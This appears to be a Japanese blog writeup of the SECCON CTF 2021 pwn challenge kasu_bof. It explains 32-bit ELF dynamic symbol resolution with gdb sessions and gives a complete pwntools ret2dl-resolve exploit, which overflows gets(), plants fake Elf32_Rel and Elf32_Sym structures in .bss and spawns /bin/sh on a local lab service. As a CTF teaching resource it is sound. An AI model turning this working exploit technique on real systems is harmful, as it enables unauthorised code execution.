@@ -1,0 +1,715 @@
+---
+title: "SECCON CTF 2021 - kasu_bof Writeup"
+date: 2022-11-11T11:29:55+09:00
+draft: false
+summary: "本記事はSECCON CTF 2021のPwn問題kasu_bofのWriteupです。"
+author: "mc4nf"
+---
+
+
+#+HUGO_BASE_DIR: ./
+
+** 問題
+*** 問題文
+#+begin_example
+## Question
+Do you understand return-to-dl-resolve attack on 32-bit?   
+#+end_example
+
+*** 配布ファイル
+- ~main.c~
+- ~chall~
+      
+**** ~main.c~
+#+begin_src c
+    #include <stdio.h>
+
+    int main(void) {
+      char buf[0x80];
+      gets(buf);
+      return 0;
+    }
+#+end_src
+
+**** ~chall~
+#+begin_example
+mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ file chall
+chall: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=cb260735eeb00c173f7f530e9fae9ee3704e6c6f, for GNU/Linux 3.2.0, not stripped
+
+mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
+[*] '/home/mc4nf/ctf/seccon2021/pwn/kasu_bof/chall'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+#+end_example
+- x86
+- SSP無効
+- Partial RELRO
+      
+** 方針
+配布されたソースコード ( ~main.c~ )を見てみると、以下の特徴がある。
+- ~buf~ のサイズが ~0x80~ 
+- ~gets~ を使用しているため、 ~buf~ に任意の文字数を入力可能
+
+  
+このことから，配布されたプログラムには簡単なスタックバッファオーバフローの脆弱性があることがわかる．
+
+
+また、問題文に ~return to dl resolve~ という攻撃方法を使用すれば良い旨のコメントがあるため，
+スタックバッファオーバフローを利用して， ~return to dl resolve~ を用いて ~shell~ を起動できるとよさそうである．
+
+
+よって、この問題以下の方針で解いていく。
+1. *return to dl resolve* を利用するため、 ~.plt~ セクションからライブラリ関数のアドレスが解決するまでの流れを調査
+2. 1.を踏まえて、 *return to dl resolve* を利用し、 ~shell~ を起動
+
+** 1. return to dl resolve (ret2dl resolve)
+   return to dl resolveは、ライブラリ関数のアドレスを動的に解決する際に呼び出される関数である ~_dl_runtime_resolve_xsavec~ を利用し、任意のライブラリ関数を呼び出す攻撃手法である。
+
+   この攻撃の流れは以下のようになる。
+
+   1. 任意の関数(ここでは ~shell~ )を呼ぶため、 ~_dl_runtime_resolve_xsavec~ に読み込ませる偽の ~Elf32_Rel~ 構造体と ~Elf32_Sym~ 構造体、および  ~system~ 、 ~/bin/sh~ を書き込み可能な領域に用意
+   2. ~_dl_runtime_resolve_xsavec~ が ~Elf32_Rel~ 構造体を特定するために引数に取る ~reloc_arg~ を、偽の ~Elf32_Rel~ を指すように指定
+   3. ~.plt~ の先頭にジャンプし、偽の構造体を元に ~system~ のアドレスを解決し、 ~system("/bin/sh")~ を実行
+
+   そこで、以下では、pltセクションからアドレス解決の流れを説明し、如何にして偽の構造体を作成すればよいかについて説明する。
+      
+*** ~.plt~ セクションからアドレス解決の流れ
+    ~.plt~ セクションから、 ~link_map~ 構造体を元にそれぞれのセクションのアドレスが特定され、それぞれのセクションに含まれる情報を参照することにより、ライブラリ関数のシンボルを解決する。
+
+    
+    そこで、以下では、 ~gets@plt~ が呼び出されてから ~gets~ のシンボルが解決されるまでの流れを示す。
+
+
+    参考
+    #+begin_example    
+        .rel.plt                         .dynsym                                           .dynstr                                    
+            |                                |                                                 |
+            |                                |                                                 |
+reloc_arg---+   reroc_arg + .rel.plt         |                                                 |
+            |                                |                                                 |
+            +-->|-----------+----------|     |                                                 |
+                | Elf32_Rel | r_offset |     |                                                 |
+                |           | r_info   |-----+  (r_info>>8 + .dynsym)*sizeof(Elf32_Sym)        |
+                |-----------+----------|     |                                                 |
+                                             |                                                 |
+                                             +->|-----------+---------------------------|      |
+                                                | Elf32_Sym | st_name                   |------+   st_name + .dynstr
+                                                |           | st_value                  |      |
+                                                |           | st_size                   |      |
+                                                |           | st_info st_other st_shndx |      |
+                                                |-----------+---------------------------|      |
+                                                                                               |
+                                                                                               +-->|-----------+----------|
+                                                                                                   | symbol    |  'gets'  |
+                                                                                                   |-----------+----------|
+    #+end_example
+    
+**** ~link_map~ 構造体
+   ~link_map~ はELFファイルと実際にマッピングされたアドレスの差分や各セクションのアドレス，再配置情報を保持する構造体であり、ライブラリ関数のシンボルを解決する際に参照される。   
+
+   ~plt~ にジャンプする前に、 ~link_map~ 構造体のアドレス（GOTの2番目のエントリ）とGOTのオフセット ( ~reloc_arg~ )がスタックに格納される。
+     - https://elixir.bootlin.com/glibc/latest/source/include/link.h#L86
+	 #+begin_src c
+	   /* Structure describing a loaded shared object.  The `l_next' and `l_prev'
+	      members form a chain of all the shared objects loaded at startup.
+
+	      These data structures exist in space used by the run-time dynamic linker;
+	      modifying them may have disastrous results.
+
+	      This data structure might change in future, if necessary.  User-level
+	      programs must avoid defining objects of this type.  */
+
+	   struct link_map
+	     {
+	       /* These first few members are part of the protocol with the debugger.
+		  This is the same format used in SVR4.  */
+
+	       ElfW(Addr) l_addr;		/* Difference between the address in the ELF
+					      file and the addresses in memory.  */
+	       char *l_name;		/* Absolute file name object was found in.  */
+	       ElfW(Dyn) *l_ld;		/* Dynamic section of the shared object.  */
+	       struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
+	 #+end_src
+	 
+     以下の例の場合， ~link_map~ 構造体のアドレス ~0x804c004~ と ~gets~ の ~reloc_arg~ ~0x0~ をスタックにプッシュしている。
+	#+begin_src
+     gef➤  x/10i $eip
+     => 0x8049030:   push   DWORD PTR ds:0x804c004
+	0x8049036:   jmp    DWORD PTR ds:0x804c008
+	0x804903c:   add    BYTE PTR [eax],al
+	0x804903e:   add    BYTE PTR [eax],al
+	0x8049040 <gets@plt>:        jmp    DWORD PTR ds:0x804c00c
+	0x8049046 <gets@plt+6>:      push   0x0
+	0x804904b <gets@plt+11>:     jmp    0x8049030
+	0x8049050 <__libc_start_main@plt>:   jmp    DWORD PTR ds:0x804c010
+	0x8049056 <__libc_start_main@plt+6>: push   0x8
+	0x804905b <__libc_start_main@plt+11>:        jmp    0x8049030
+	#+end_src
+   
+
+   以下のサイトを参考に、gdbで、ELFの構造体を読み込めるようにする。
+   - https://inaz2.hatenablog.com/entry/2014/07/21/124857
+     - gdbに ~link.h~ および ~elf.h~ のシンボル情報を読み込み
+       #+begin_src 
+	 gcc -g -fno-eliminate-unused-debug-types -x c -m32 -c /usr/include/link.h -o link.o
+       #+end_src
+       今回はx86のELFを対象としているため ~-m32~ オプションを指定
+
+   特定した ~link_map~ 構造体のアドレス ~0xf7ffd990~ の中身を表示してみる。
+   #+begin_src 
+	 gef➤  add-symbol-file link.o 0
+	 add symbol table from file "link.o" at
+		 .text_addr = 0x0
+	 Reading symbols from link.o...
+	 gef➤  set $l = (struct link_map *) 0xf7ffd990
+	 gef➤  print *$l
+	 $1 = {
+	   l_addr = 0x0,
+	   l_name = 0xf7ffdc84 "",
+	   l_ld = 0x804bf14,
+	   l_next = 0xf7ffdc90,
+	   l_prev = 0x0
+	 }
+   #+end_src
+
+**** ~.dynamic~ セクション
+  ~.dynamic~ セクションのアドレスは， ~link_map~ 構造体の ~l_ld~ に格納されるため、
+  ~.dynamic~ セクションのアドレスは ~0x804bf14~ であるとわかる。
+   
+  ~.dynamic~ セクションは， ~ELF_Dyn~ 構造体のエントリを ~d_tag~ の種類の数保持しており、この中に ~.rel.plt~ や ~.dynsym~ , ~.dynstr~ などのアドレスが格納されている。
+    - ELF_Dyn 構造体
+      - https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L838
+	#+begin_src c
+	  /* Dynamic section entry.  */
+
+	  typedef struct
+	  {
+	    Elf32_Sword d_tag;			/* Dynamic entry type */
+	    union
+	      {
+		Elf32_Word d_val;			/* Integer value */
+		Elf32_Addr d_ptr;			/* Address value */
+	      } d_un;
+	  } Elf32_Dyn;
+
+	  typedef struct
+	  {
+	    Elf64_Sxword d_tag;			/* Dynamic entry type */
+	    union
+	      {
+		Elf64_Xword d_val;		/* Integer value */
+		Elf64_Addr d_ptr;			/* Address value */
+	      } d_un;
+	  } Elf64_Dyn;
+	#+end_src
+	 
+    - d_tagの定義
+      - https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L860
+	#+begin_src c
+	  /* Legal values for d_tag (dynamic entry type).  */
+	  ...
+	  #define DT_STRTAB	5		/* Address of string table */
+	  #define DT_SYMTAB	6		/* Address of symbol table */
+	  ...
+	  #define DT_REL	17		/* Address of Rel relocs */
+	  ...
+	  #define DT_JMPREL	23		/* Address of PLT relocs */
+	  ...
+	#+end_src
+	 
+    また、このとき ~.dynamic~ セクションは， ~d_tag~ の順番に並んでいる訳ではないことに注意。
+    - 以下の例では， ~DT_STRTAB, DT_SYMTAB~ は8，9番目のエントリ， ~DT_JMPREL, DT_REL~ は16，17番目のエントリに配置
+      #+begin_src 
+      0x0804bf14│+0x0000   <_DYNAMIC+0000> 0x00000001
+      0x0804bf18│+0x0004   <_DYNAMIC+0004> 0x00000001
+      ...
+      0x0804bf54│+0x0040   <_DYNAMIC+0040> 0x00000005 // DT_STRTAB
+      0x0804bf58│+0x0044   <_DYNAMIC+0044> 0x0804825c
+      0x0804bf5c│+0x0048   <_DYNAMIC+0048> 0x00000006 // DT_SYMTAB
+      0x0804bf60│+0x004c   <_DYNAMIC+004c> 0x0804820c
+      ...
+      0x0804bf94│+0x0080   <_DYNAMIC+0080> 0x00000017 // DT_JMPREL
+      0x0804bf98│+0x0084   <_DYNAMIC+0084> 0x080482d8
+      0x0804bf9c│+0x0088   <_DYNAMIC+0088> 0x00000011 // DT_REL
+      0x0804bfa0│+0x008c   <_DYNAMIC+008c> 0x080482d0
+      ...
+      #+end_src
+       
+**** ~.rel.plt~ セクション
+  ~rel.plt~ セクションは， ~ELF_Rel~ 構造体の配列となっている。
+    - ELF_Rel 構造体
+      - https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L632
+	#+begin_src c
+	  /* Relocation table entry without addend (in section of type SHT_REL).  */
+
+	  typedef struct
+	  {
+	    Elf32_Addr	r_offset;		/* Address */
+	    Elf32_Word	r_info;			/* Relocation type and symbol index */
+	  } Elf32_Rel;
+
+	  /* I have seen two different definitions of the Elf64_Rel and
+	     Elf64_Rela structures, so we'll leave them out until Novell (or
+	     whoever) gets their act together.  */
+	  /* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */
+
+	  typedef struct
+	  {
+	    Elf64_Addr	r_offset;		/* Address */
+	    Elf64_Xword	r_info;			/* Relocation type and symbol index */
+	  } Elf64_Rel;
+
+	  /* Relocation table entry with addend (in section of type SHT_RELA).  */
+
+	  typedef struct
+	  {
+	    Elf32_Addr	r_offset;		/* Address */
+	    Elf32_Word	r_info;			/* Relocation type and symbol index */
+	    Elf32_Sword r_addend;		/* Addend */
+	  } Elf32_Rela;
+
+	  typedef struct
+	  {
+	    Elf64_Addr	r_offset;		/* Address */
+	    Elf64_Xword r_info;			/* Relocation type and symbol index */
+	    Elf64_Sxword r_addend;		/* Addend */
+	  } Elf64_Rela;
+
+	  /* RELR relocation table entry */
+
+	  typedef Elf32_Word	Elf32_Relr;
+	  typedef Elf64_Xword	Elf64_Relr;
+      #+end_src
+
+     ~.dynamic~ セクションから取得した ~.rel.plt~ のアドレス先をgdbでダンプしてみる。
+      - ~reloc_arg~ が ~.rel.plt~ のインデックス
+	#+begin_src 
+	  gef➤  ser $reloc_arg = 0x0
+	  gef➤  set $reloc = &((Elf32_Rel *)($l.l_ld[16].d_un.d_ptr))[$reloc_arg]
+	  gef➤  print *$reloc
+	  $10 = {
+	      r_offset = 0x804c00c,
+	      r_info = 0x107
+	  }
+
+	  gef➤  dd 0x080482d8
+	  0x080482d8│+0x0000   0x0804c00c // getsのGOTエントリ (reloc_arg = 0x0)
+	  0x080482dc│+0x0004   0x00000107
+	  0x080482e0│+0x0008   0x0804c010 // __libc_start_mainのGOTエントリ (reloc_arg = 0x1)
+	  0x080482e4│+0x000c   0x00000307
+	  0x080482e8│+0x0010   0x00000000
+	  0x080482ec│+0x0014   0x00000000
+      #+end_src
+	 
+    ~r_info~ は，シンボルを解決するために使用される。
+    ~r_info~ を 8 byte 右シフトすることにより， ~dynsym~ のインデックスを取得することができる。
+    - ~r_info~ の定義
+      #+begin_src c
+	/* How to extract and insert information held in the r_info field.  */
+
+	#define ELF32_R_SYM(val)		((val) >> 8)
+	#define ELF32_R_TYPE(val)		((val) & 0xff)
+	#define ELF32_R_INFO(sym, type)	(((sym) << 8) + ((type) & 0xff))
+
+	#define ELF64_R_SYM(i)			((i) >> 32)
+	#define ELF64_R_TYPE(i)		((i) & 0xffffffff)
+	#define ELF64_R_INFO(sym,type)		((((Elf64_Xword) (sym)) << 32) + (type))
+      #+end_src
+       
+**** ~.dynsym~ セクション
+    ~.dynsym~ セクションは， ~Elf_Sym~ 構造体の配列となっている。
+      - ELF_Sym 構造体
+	- https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L517
+	  #+begin_src c
+	    /* Symbol table entry.  */
+
+	    typedef struct
+	    {
+	      Elf32_Word	st_name;		/* Symbol name (string tbl index) */
+	      Elf32_Addr	st_value;		/* Symbol value */
+	      Elf32_Word	st_size;		/* Symbol size */
+	      unsigned char st_info;		/* Symbol type and binding */
+	      unsigned char st_other;		/* Symbol visibility */
+	      Elf32_Section st_shndx;		/* Section index */
+	    } Elf32_Sym;
+
+	    typedef struct
+	    {
+	      Elf64_Word	st_name;		/* Symbol name (string tbl index) */
+	      unsigned char st_info;		/* Symbol type and binding */
+	      unsigned char st_other;		/* Symbol visibility */
+	      Elf64_Section st_shndx;		/* Section index */
+	      Elf64_Addr	st_value;		/* Symbol value */
+	      Elf64_Xword st_size;		/* Symbol size */
+	    } Elf64_Sym;
+           #+end_src
+	  - ~st_name~ は，実際にシンボルが置かれている ~.dynstr~ セクションのオフセット
+    ~r_info~ からインデックスを計算し、 ~Elf32_Sym~ のアドレスを特定してみる。
+    #+begin_src
+      gef➤  set $symtab = (Elf32_Sym *)($l.l_ld[9].d_un.d_ptr)
+      gef➤  set $sym = $symtab[$reloc.r_info>>8]
+      gef➤  print $sym
+      $7 = {
+	st_name = 0x1a,
+	st_value = 0x0,
+	st_size = 0x0,
+	st_info = 0x12,
+	st_other = 0x0,
+	st_shndx = 0x0
+      }
+    #+end_src
+**** ~.dynstr~ セクション
+    ~st_name~ のオフセットを ~.dynstr~ セクションのアドレスに足し合わせたアドレスが，シンボルを指すアドレスとなっている。
+    - 以下の例では， ~l_ld~ から ~.dynsym~ セクションのアドレスを取得し，その後 ~r_info~ から取得したインデックスを元に ~.dynstr~ セクションからシンボル名を解決 ( ~reloc_arg = 0~ の ~gets~ が解決)
+    #+begin_src
+      gef➤  set $strtab = (char*)($l.l_ld[8].d_un.d_ptr)
+      gef➤  set $undef_name = $strtab + $sym.st_name
+      gef➤  print $undef_name
+      $8 = 0x8048276 "gets"
+    #+end_src
+    これにより、 ~link_map~ 構造体から ~gets~ のシンボルが解決されるまでの流れを把握することができた。
+
+    そこで、次にこの流れを踏まえた上で、 ~system("/bin/sh")~ 呼び出すためのSolverを作成していく。
+
+
+** 2. Solverの作成    
+*** Solverの準備
+    上記の流れを図にすると、それぞれのセクションと構造体とシンボルの関係は以下のようになる。
+#+begin_example    
+        .rel.plt                         .dynsym                                           .dynstr                                    
+            |                                |                                                 |
+            |                                |                                                 |
+reloc_arg---+   reroc_arg + .rel.plt         |                                                 |
+            |                                |                                                 |
+            +-->|-----------+----------|     |                                                 |
+                | Elf32_Rel | r_offset |     |                                                 |
+                |           | r_info   |-----+  (r_info>>8 + .dynsym)*sizeof(Elf32_Sym)        |
+                |-----------+----------|     |                                                 |
+                                             |                                                 |
+                                             +->|-----------+---------------------------|      |
+                                                | Elf32_Sym | st_name                   |------+   st_name + .dynstr
+                                                |           | st_value                  |      |
+                                                |           | st_size                   |      |
+                                                |           | st_info st_other st_shndx |      |
+                                                |-----------+---------------------------|      |
+                                                                                               |
+                                                                                               +-->|-----------+----------|
+                                                                                                   | symbol    | 'system' |
+                                                                                                   |-----------+----------|
+    #+end_example
+    ここで、 ~reloc_arg~ にはスタックバッファオーバフローを利用して任意の値を指定することが可能なため、 ~.rel.plt~ の値から偽の ~Elf32_Rel~ 構造体を配置したアドレスまでのオフセットを設定する。
+    #+begin_src python
+      reloc_arg = Elf32_Rel_addr - rel
+    #+end_src
+    
+    また、偽の ~Elf32_Rel~ 構造体では、 ~r_info~ を 8 bitだけ右シフトした値を ~.dynsym~ を基準とした偽の ~Elf32_Sym~ 構造体へのインデックスとして使用する。
+    このため、事前にインデックスを計算し、 ~Elf32_Rel~ 構造体に格納しておく。
+    このとき、 ~r_info~ の下bitが ~0b111 (0x7)~ である必要があるため、最後に ~7~ を or することで下3bitに1を立てている。
+
+    ~r_offset~ は、解決されたアドレスが格納されるアドレスであり、通常は ~.got~ の対応するエントリを指している。
+    今回は特に関係ないものの、 ~gets~ の GOTエントリを指定しておく。    
+    #+begin_src python
+      r_offset = gets_got
+      r_info   = ((Elf32_Sym_addr - dynsym)//0x10)<<8 | 7
+    #+end_src
+    
+    ~Elf32_Sym~ 構造体の ~st_name~ は、 ~.dynstr~ の値から ~system~ のシンボルを配置したアドレスまでのオフセットを設定する。
+    このため、事前にオフセットの値を計算し、 ~Elf32_Sym~ 構造体に格納しておく。
+
+    ~st_info~ は、global変数であることを指す ~0x12~ を設定しておく必要があるため、設定しておく。
+    #+begin_src python
+      st_name = system_symbol_addr - dynstr
+      st_value = 0x0
+      st_size = 0x0
+      st_info = 0x12
+      st_other = 0x0
+      st_shndx = 0x0
+    #+end_src
+
+**** ~.bss~ 領域への作成した構造体やシンボルの格納
+    ~.bss~ 領域には，以下のように作成した ~Elf32_Rel~ 構造体と ~Elf32_Sym~ 構造体， ~system~ のシンボル，および ~/bin/sh~ の文字列が格納する．    
+    #+begin_example
+    |-----------+----------.bss-------------+---------|
+    | Elf32_Rel | r_offset                  | 8 byte  |
+    |           | r_info                    |         |
+    |-----------+---------------------------+---------|
+    |           |                           | 8 byte  |
+    |           |                           | (align) |
+    |-----------+---------------------------+---------|
+    | Elf32_Sym | st_name                   | 16 byte |
+    |           | st_value                  |         |
+    |           | st_size                   |         |
+    |           | st_info st_other st_shndx |         |
+    |-----------+---------------------------+---------|
+    |           |                           | 4byte   |
+    |-----------+---------------------------+---------|
+    | symbol    | 'system'                  | 4byte   |
+    |-----------+---------------------------+---------|
+    |           |                           | 4byte   |
+    |-----------+---------------------------+---------|
+    | argment   | '/bin/sh'                 | 4byte   |
+    |-----------+---------------------------+---------|
+    |           |                           |         |
+    #+end_example
+    このとき， ~Elf32_Sym~ 構造体は， ~dynsym~ セクションのアドレスから， ~0x10~ byteの間隔で配置されなければならないため( ~Elf32_Sym~ 構造体のサイズが ~0x10~ byteのため)，
+    必要なbyte数だけalignしている．
+
+    Solverを書くときは，事前に ~.bss~ のどのアドレスがどの構造体やシンボルに対応するか計算しておき，ROPで ~gets~ の引数として指定しておき，ROPチェインが発火後に，それぞれの構造体やシンボルを書き込んでいく．
+        #+begin_src python
+      Elf32_Rel_addr = bss
+
+      Elf32_Sym_addr = Elf32_Rel_addr + 0x10
+
+      system_symbol_addr = Elf32_Sym_addr + 0x14
+
+      sh_symbol_addr = system_symbol_addr + 0x1c
+    #+end_src
+
+**** ROPチェインの作成
+     あとは、用意した偽の構造体やシンボルを ~.bss~ 領域内に格納できるように、複数回 ~gets~ を呼び出す必要がある。
+
+     そこで、 それぞれ計算しておいた領域に構造体を引数とし、 ~gets@plt~ にジャンプするROPを組む。
+     x86のROPは、参考のセキュリティコンテストチャレンジブックが参考になる。
+     
+     #+begin_src python
+      # padding
+      buf = b'A'*0x84                 # fill stack
+      buf += p32(0xdeadbeaf)         # saved_ebp
+
+      # gets(Elf32_Rel_addr)
+      buf += p32(gets_plt)           # main return addr
+      buf += p32(pop_ret)            # gets return addr
+      buf += p32(Elf32_Rel_addr)     # gets arg
+
+      # gets(Elf32_Sym_addr)
+      buf += p32(gets_plt)           # pop ret return addr
+      buf += p32(pop_ret)            # gets return addr
+      buf += p32(Elf32_Sym_addr)     # gets arg
+
+      # gets(system_symbol_addr)
+      buf += p32(gets_plt)           # pop ret return addr
+      buf += p32(pop_ret)            # gets return addr
+      buf += p32(system_symbol_addr) # gets arg
+
+      # gets(sh_symbol_addr)
+      buf += p32(gets_plt)           # pop ret return addr
+      buf += p32(pop_ret)            # gets return  addr
+      buf += p32(sh_symbol_addr)     # gets arg
+     #+end_src
+
+     それぞれの構造体とシンボルの書き込みを行うROPを組んだ後、偽の構造体を元にアドレスを解決させるため、 ~.plt~ セクションの先頭にジャンプする。
+     このとき、 ~system~ の引数として ~/bin/sh~ を取れるように、 ~/bin/sh~ が格納されたアドレスをスタックに積んでおく。
+     #+begin_src python
+      # system('/bin/sh')
+      buf += p32(plt)                # pop ret return addr
+      buf += p32(reloc_arg)          # reloc arg
+      buf += p32(0xdeadbeef)         # padding
+      buf += p32(sh_symbol_addr)     # system arg
+     #+end_src
+
+*** Solver
+**** solve.py
+    #+begin_src python
+      from pwn import *
+
+      filename = './chall'
+      chall = ELF(filename)
+
+      # docker-compose up
+      conn = remote('localhost', 9001)
+      # conn = process(filename)
+
+      plt = chall.get_section_by_name('.plt').header.sh_addr
+      bss = chall.get_section_by_name('.bss').header.sh_addr
+      rel = chall.get_section_by_name('.rel.plt').header.sh_addr
+      dynsym = chall.get_section_by_name('.dynsym').header.sh_addr
+      dynstr = chall.get_section_by_name('.dynstr').header.sh_addr
+      gets_got = chall.got['gets']
+      gets_plt = chall.plt['gets']
+
+      # 0x08049022: pop ebx; ret;
+      pop_ret = 0x08049022
+
+      # .bss section
+      # |-----------+---------------------------+---------|
+      # | Elf32_Rel | r_offset                  | 8 byte  |
+      # |           | r_info                    |         |
+      # |-----------+---------------------------+---------|
+      # |           |                           | 8 byte  |
+      # |           |                           | (align) |
+      # |-----------+---------------------------+---------|
+      # | Elf32_Sym | st_name                   | 16 byte |
+      # |           | st_value                  |         |
+      # |           | st_size                   |         |
+      # |           | st_info st_other st_shndx |         |
+      # |-----------+---------------------------+---------|
+      # |           |                           | 4byte   |
+      # |-----------+---------------------------+---------|
+      # | symbol    | 'system'                  | 4byte   |
+      # |-----------+---------------------------+---------|
+      # |           |                           | 4byte   |
+      # |-----------+---------------------------+---------|
+      # | argment   | '/bin/sh'                 | 4byte   |
+      # |-----------+---------------------------+---------|
+      # |           |                           |         |
+
+      Elf32_Rel_addr = bss
+
+      Elf32_Sym_addr = Elf32_Rel_addr + 0x10
+
+      system_symbol_addr = Elf32_Sym_addr + 0x14
+
+      sh_symbol_addr = system_symbol_addr + 0x1c
+
+      # calc index of Elf32_Rel from .rel.plt
+      reloc_arg = Elf32_Rel_addr - rel
+
+      # padding
+      buf = b'A'*0x84                 # fill stack
+      buf += p32(0xdeadbeaf)         # saved_ebp
+
+      # gets(Elf32_Rel_addr)
+      buf += p32(gets_plt)           # main return addr
+      buf += p32(pop_ret)            # gets return addr
+      buf += p32(Elf32_Rel_addr)     # gets arg
+
+      # gets(Elf32_Sym_addr)
+      buf += p32(gets_plt)           # pop ret return addr
+      buf += p32(pop_ret)            # gets return addr
+      buf += p32(Elf32_Sym_addr)     # gets arg
+
+      # gets(system_symbol_addr)
+      buf += p32(gets_plt)           # pop ret return addr
+      buf += p32(pop_ret)            # gets return addr
+      buf += p32(system_symbol_addr) # gets arg
+
+      # gets(sh_symbol_addr)
+      buf += p32(gets_plt)           # pop ret return addr
+      buf += p32(pop_ret)            # gets return  addr
+      buf += p32(sh_symbol_addr)     # gets arg
+
+      # system('/bin/sh')
+      buf += p32(plt)                # pop ret return addr
+      buf += p32(reloc_arg)          # reloc arg
+      buf += p32(0xdeadbeef)         # padding
+      buf += p32(sh_symbol_addr)     # system arg
+
+      conn.sendline(buf)
+
+      # create Elf32_Rel
+      ###################################################################################
+      # typedef struct
+      # {
+      #     Elf32_Addr	r_offset;		/* Address */
+      #     Elf32_Word	r_info;			/* Relocation type and symbol index */
+      # } Elf32_Rel;
+      ###################################################################################
+      r_offset = gets_got
+      r_info   = ((Elf32_Sym_addr - dynsym)//0x10)<<8 | 7
+
+      # |-----------+---------------------------+---------|
+      # | Elf32_Rel | r_offset                  | 8 byte  |
+      # |           | r_info                    |         |
+      # |-----------+---------------------------+---------|
+      Elf32_Rel = p32(r_offset)
+      Elf32_Rel += p32(r_info)
+    
+      conn.sendline(Elf32_Rel)
+
+      # create Elf32_Sym
+      ###################################################################################
+      # typedef struct
+      # {
+      #     Elf32_Word	st_name;		/* Symbol name (string tbl index) */
+      #     Elf32_Addr	st_value;		/* Symbol value */
+      #     Elf32_Word	st_size;		/* Symbol size */
+      #     unsigned char st_info;		/* Symbol type and binding */
+      #     unsigned char st_other;		/* Symbol visibility */
+      #     Elf32_Section st_shndx;		/* Section index */
+      # } Elf32_Sym;
+      ###################################################################################
+      st_name = system_symbol_addr - dynstr
+      st_value = 0x0
+      st_size = 0x0
+      st_info = 0x12
+      st_other = 0x0
+      st_shndx = 0x0
+
+      # |-----------+---------------------------+---------|
+      # | Elf32_Sym | st_name                   | 16 byte |
+      # |           | st_value                  |         |
+      # |           | st_size                   |         |
+      # |           | st_info st_other st_shndx |         |
+      # |-----------+---------------------------+---------|
+      Elf32_Sym = p32(st_name)
+      Elf32_Sym += p32(st_value)
+      Elf32_Sym += p32(st_size)
+      Elf32_Sym += p8(st_info)
+      Elf32_Sym += p8(st_other)
+      Elf32_Sym += p16(st_shndx)
+
+      conn.sendline(Elf32_Sym)
+
+      # create system symbol
+      # |-----------+---------------------------+---------|
+      # | symbol    | 'system'                  | 4byte   |
+      # |-----------+---------------------------+---------|
+      conn.sendline(b'system')
+
+      # create sh symbol
+      # |-----------+---------------------------+---------|
+      # | argment   | '/bin/sh'                 | 4byte   |
+      # |-----------+---------------------------+---------|
+      conn.sendline(b'/bin/sh')
+
+      conn.interactive()
+    #+end_src
+    
+**** 実行結果
+     #+begin_example
+mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ python solve.py 
+[*] '/home/mc4nf/ctf/seccon2021/pwn/kasu_bof/chall'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Opening connection to localhost on port 9001: Done
+[*] Switching to interactive mode
+$ ls
+chall
+flag-4f8e964cf95b989f6def1afdfd0e91b7.txt
+$ cat flag*
+SECCON{jUst_4_s1mpL3_b0f_ch4ll3ng3}
+     #+end_example
+
+**** ~SECCON{jUst_4_s1mpL3_b0f_ch4ll3ng3}~
+     
+**  参考
+- 詳解セキュリティコンテスト
+  - https://book.mynavi.jp/ec/products/detail/id=122750
+  - 33.2.2 発展：関数シンボルの動的解決 pp.525
+  
+- ROP stager + Return-to-dl-resolveによるASLR+DEP回避 - ももいろテクノロジー   
+  - https://inaz2.hatenablog.com/entry/2014/07/15/023406
+
+- ret2dl resolve - slideshare
+  - https://www.slideshare.net/sounakano/ret2dl-resolve
+
+- セキュリティコンテストチャレンジブック
+  - https://book.mynavi.jp/ec/products/detail/id=42421
+  - 2.4 エクスプロイト - Retrun to PLT (ret2plt) pp.109
+    - x86のROP
+
+- リンカ・ローダ実践開発テクニック
+  - https://shop.cqpub.co.jp/hanbai/books/38/38071.html
+  - 2.9 シンボル・テーブル pp.54
+    - Elf_Sym構造体について    
+  - 2.10 再配置テーブル pp.57
+    - Elf_Rel構造体について
+
+- gdbに構造体定義を読み込ませて使う - ももいろテクノロジー
+  - https://inaz2.hatenablog.com/entry/2014/07/21/124857
